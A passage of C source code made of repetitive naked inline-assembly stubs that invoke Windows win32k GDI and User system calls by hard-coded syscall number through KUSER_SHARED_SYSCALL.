        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetLinkedUFIs()
{
    __asm {
        mov eax, 000010B6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetMiterLimit()
{
    __asm {
        mov eax, 000010B7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetMonitorID()
{
    __asm {
        mov eax, 000010B8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetNearestColor()
{
    __asm {
        mov eax, 000010B9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetNearestPaletteIndex()
{
    __asm {
        mov eax, 000010BAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetObjectBitmapHandle()
{
    __asm {
        mov eax, 000010BBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetOutlineTextMetricsInternalW()
{
    __asm {
        mov eax, 000010BCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetPath()
{
    __asm {
        mov eax, 000010BDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetPixel()
{
    __asm {
        mov eax, 000010BEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRandomRgn()
{
    __asm {
        mov eax, 000010BFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRasterizerCaps()
{
    __asm {
        mov eax, 000010C0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRealizationInfo()
{
    __asm {
        mov eax, 000010C1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRegionData()
{
    __asm {
        mov eax, 000010C2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRgnBox()
{
    __asm {
        mov eax, 000010C3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetServerMetaFileBits()
{
    __asm {
        mov eax, 000010C4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetSpoolMessage()
{
    __asm {
        mov eax, 000010C5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetStats()
{
    __asm {
        mov eax, 000010C6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetStockObject()
{
    __asm {
        mov eax, 000010C7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetStringBitmapW()
{
    __asm {
        mov eax, 000010C8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetSystemPaletteUse()
{
    __asm {
        mov eax, 000010C9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextCharsetInfo()
{
    __asm {
        mov eax, 000010CAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextExtent()
{
    __asm {
        mov eax, 000010CBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextExtentExW()
{
    __asm {
        mov eax, 000010CCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextFaceW()
{
    __asm {
        mov eax, 000010CDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextMetricsW()
{
    __asm {
        mov eax, 000010CEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTransform()
{
    __asm {
        mov eax, 000010CFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetUFI()
{
    __asm {
        mov eax, 000010D0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetEmbUFI()
{
    __asm {
        mov eax, 000010D1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetUFIPathname()
{
    __asm {
        mov eax, 000010D2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetEmbedFonts()
{
    __asm {
        mov eax, 000010D3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiChangeGhostFont()
{
    __asm {
        mov eax, 000010D4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddEmbFontToDC()
{
    __asm {
        mov eax, 000010D5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontUnicodeRanges()
{
    __asm {
        mov eax, 000010D6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetWidthTable()
{
    __asm {
        mov eax, 000010D7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGradientFill()
{
    __asm {
        mov eax, 000010D8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiHfontCreate()
{
    __asm {
        mov eax, 000010D9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiIcmBrushInfo()
{
    __asm {
        mov eax, 000010DAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiInit()
{
    __asm {
        mov eax, 000010DBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiInitSpool()
{
    __asm {
        mov eax, 000010DCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiIntersectClipRect()
{
    __asm {
        mov eax, 000010DDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiInvertRgn()
{
    __asm {
        mov eax, 000010DEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiLineTo()
{
    __asm {
        mov eax, 000010DFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiMakeFontDir()
{
    __asm {
        mov eax, 000010E0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMakeInfoDC()
{
    __asm {
        mov eax, 000010E1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMaskBlt()
{
    __asm {
        mov eax, 000010E2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000034h
    }
}

__declspec(naked) ULONG NTAPI NtGdiModifyWorldTransform()
{
    __asm {
        mov eax, 000010E3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiMonoBitmap()
{
    __asm {
        mov eax, 000010E4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMoveTo()
{
    __asm {
        mov eax, 000010E5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiOffsetClipRgn()
{
    __asm {
        mov eax, 000010E6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiOffsetRgn()
{
    __asm {
        mov eax, 000010E7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiOpenDCW()
{
    __asm {
        mov eax, 000010E8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiPatBlt()
{
    __asm {
        mov eax, 000010E9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPolyPatBlt()
{
    __asm {
        mov eax, 000010EAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPathToRegion()
{
    __asm {
        mov eax, 000010EBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPlgBlt()
{
    __asm {
        mov eax, 000010ECh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiPolyDraw()
{
    __asm {
        mov eax, 000010EDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPolyPolyDraw()
{
    __asm {
        mov eax, 000010EEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPolyTextOutW()
{
    __asm {
        mov eax, 000010EFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPtInRegion()
{
    __asm {
        mov eax, 000010F0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiPtVisible()
{
    __asm {
        mov eax, 000010F1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiQueryFonts()
{
    __asm {
        mov eax, 000010F2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiQueryFontAssocInfo()
{
    __asm {
        mov eax, 000010F3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRectangle()
{
    __asm {
        mov eax, 000010F4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRectInRegion()
{
    __asm {
        mov eax, 000010F5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRectVisible()
{
    __asm {
        mov eax, 000010F6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRemoveFontResourceW()
{
    __asm {
        mov eax, 000010F7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRemoveFontMemResourceEx()
{
    __asm {
        mov eax, 000010F8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiResetDC()
{
    __asm {
        mov eax, 000010F9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiResizePalette()
{
    __asm {
        mov eax, 000010FAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRestoreDC()
{
    __asm {
        mov eax, 000010FBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRoundRect()
{
    __asm {
        mov eax, 000010FCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSaveDC()
{
    __asm {
        mov eax, 000010FDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiScaleViewportExtEx()
{
    __asm {
        mov eax, 000010FEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiScaleWindowExtEx()
{
    __asm {
        mov eax, 000010FFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectBitmap()
{
    __asm {
        mov eax, 00001100h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectBrush()
{
    __asm {
        mov eax, 00001101h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectClipPath()
{
    __asm {
        mov eax, 00001102h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectFont()
{
    __asm {
        mov eax, 00001103h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectPen()
{
    __asm {
        mov eax, 00001104h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBitmapAttributes()
{
    __asm {
        mov eax, 00001105h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBitmapBits()
{
    __asm {
        mov eax, 00001106h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBitmapDimension()
{
    __asm {
        mov eax, 00001107h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBoundsRect()
{
    __asm {
        mov eax, 00001108h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBrushAttributes()
{
    __asm {
        mov eax, 00001109h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBrushOrg()
{
    __asm {
        mov eax, 0000110Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetColorAdjustment()
{
    __asm {
        mov eax, 0000110Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetColorSpace()
{
    __asm {
        mov eax, 0000110Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetDeviceGammaRamp()
{
    __asm {
        mov eax, 0000110Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetDIBitsToDeviceInternal()
{
    __asm {
        mov eax, 0000110Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000040h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetFontEnumeration()
{
    __asm {
        mov eax, 0000110Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetFontXform()
{
    __asm {
        mov eax, 00001110h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetIcmMode()
{
    __asm {
        mov eax, 00001111h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetLinkedUFIs()
{
    __asm {
        mov eax, 00001112h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetMagicColors()
{
    __asm {
        mov eax, 00001113h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetMetaRgn()
{
    __asm {
        mov eax, 00001114h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetMiterLimit()
{
    __asm {
        mov eax, 00001115h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceWidth()
{
    __asm {
        mov eax, 00001116h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMirrorWindowOrg()
{
    __asm {
        mov eax, 00001117h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetLayout()
{
    __asm {
        mov eax, 00001118h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetPixel()
{
    __asm {
        mov eax, 00001119h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetPixelFormat()
{
    __asm {
        mov eax, 0000111Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetRectRgn()
{
    __asm {
        mov eax, 0000111Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetSystemPaletteUse()
{
    __asm {
        mov eax, 0000111Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetTextJustification()
{
    __asm {
        mov eax, 0000111Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetupPublicCFONT()
{
    __asm {
        mov eax, 0000111Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetVirtualResolution()
{
    __asm {
        mov eax, 0000111Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetSizeDevice()
{
    __asm {
        mov eax, 00001120h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiStartDoc()
{
    __asm {
        mov eax, 00001121h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStartPage()
{
    __asm {
        mov eax, 00001122h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStretchBlt()
{
    __asm {
        mov eax, 00001123h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000030h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStretchDIBitsInternal()
{
    __asm {
        mov eax, 00001124h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000040h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStrokeAndFillPath()
{
    __asm {
        mov eax, 00001125h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStrokePath()
{
    __asm {
        mov eax, 00001126h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSwapBuffers()
{
    __asm {
        mov eax, 00001127h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiTransformPoints()
{
    __asm {
        mov eax, 00001128h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiTransparentBlt()
{
    __asm {
        mov eax, 00001129h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiUnloadPrinterDriver()
{
    __asm {
        mov eax, 0000112Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUnmapMemFont()
{
    __asm {
        mov eax, 0000112Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUnrealizeObject()
{
    __asm {
        mov eax, 0000112Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUpdateColors()
{
    __asm {
        mov eax, 0000112Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiWidenPath()
{
    __asm {
        mov eax, 0000112Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserActivateKeyboardLayout()
{
    __asm {
        mov eax, 0000112Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserAlterWindowStyle()
{
    __asm {
        mov eax, 00001130h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserAssociateInputContext()
{
    __asm {
        mov eax, 00001131h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserAttachThreadInput()
{
    __asm {
        mov eax, 00001132h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserBeginPaint()
{
    __asm {
        mov eax, 00001133h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserBitBltSysBmp()
{
    __asm {
        mov eax, 00001134h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserBlockInput()
{
    __asm {
        mov eax, 00001135h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildHimcList()
{
    __asm {
        mov eax, 00001136h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildHwndList()
{
    __asm {
        mov eax, 00001137h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildNameList()
{
    __asm {
        mov eax, 00001138h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildPropList()
{
    __asm {
        mov eax, 00001139h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwnd()
{
    __asm {
        mov eax, 0000113Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndLock()
{
    __asm {
        mov eax, 0000113Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndOpt()
{
    __asm {
        mov eax, 0000113Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndParam()
{
    __asm {
        mov eax, 0000113Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndParamLock()
{
    __asm {
        mov eax, 0000113Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCallMsgFilter()
{
    __asm {
        mov eax, 0000113Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallNextHookEx()
{
    __asm {
        mov eax, 00001140h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallNoParam()
{
    __asm {
        mov eax, 00001141h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallOneParam()
{
    __asm {
        mov eax, 00001142h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallTwoParam()
{
    __asm {
        mov eax, 00001143h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserChangeClipboardChain()
{
    __asm {
        mov eax, 00001144h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserChangeDisplaySettings()
{
    __asm {
        mov eax, 00001145h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCheckImeHotKey()
{
    __asm {
        mov eax, 00001146h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCheckMenuItem()
{
    __asm {
        mov eax, 00001147h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserChildWindowFromPointEx()
{
    __asm {
        mov eax, 00001148h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

